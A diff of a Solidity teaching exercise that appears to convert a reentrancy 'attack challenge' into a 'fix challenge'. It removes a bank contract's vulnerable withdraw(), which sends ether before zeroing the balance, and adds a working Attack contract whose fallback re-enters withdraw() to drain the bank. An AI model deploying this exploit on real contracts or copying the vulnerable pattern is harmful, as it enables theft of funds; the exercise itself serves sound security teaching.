@@ -1,22 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
-contract DecentralizedBanktoAttack {
+contract DecentralizedBanktoAttackFixChallenge {
     mapping(address => uint256) public balances;
 
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
 
+    // You can implement the withdraw() and related neccessary function here
+    ////////////////////////////////////////////
     function withdraw() public {
-        uint256 bal = balances[msg.sender];
-        require(bal > 0);
-
-        (bool sent, ) = msg.sender.call{value: bal}("");
-        require(sent, "Failed to send Ether");
-
-        balances[msg.sender] = 0;
+        
     }
+
+    ////////////////////////////////////////////
 
     // Helper function to check the balance of this contract
     function getBalance() public view returns (uint256) {
@@ -24,27 +22,27 @@ contract DecentralizedBanktoAttack {
     }
 }
 
-contract AttackChallenge {
-    DecentralizedBanktoAttack public decentralizedBanktoAttack;
+contract Attack {
+    DecentralizedBanktoAttackFixChallenge
+        public decentralizedBanktoAttackFixChallenge;
 
     constructor(address _decentralizedBanktoAttackAddress) {
-        decentralizedBanktoAttack = DecentralizedBanktoAttack(
+        decentralizedBanktoAttackFixChallenge = DecentralizedBanktoAttackFixChallenge(
             _decentralizedBanktoAttackAddress
         );
     }
 
-    // You can implement the attack() and related neccessary function here
-    ////////////////////////////////////////////
-
     fallback() external payable {
-
+        if (address(decentralizedBanktoAttackFixChallenge).balance >= 1 ether) {
+            decentralizedBanktoAttackFixChallenge.withdraw();
+        }
     }
 
     function attack() external payable {
-
+        require(msg.value >= 1 ether);
+        decentralizedBanktoAttackFixChallenge.deposit{value: 1 ether}();
+        decentralizedBanktoAttackFixChallenge.withdraw();
     }
-
-    ////////////////////////////////////////////
 
     function getBalance() public view returns (uint256) {
         return address(this).balance;
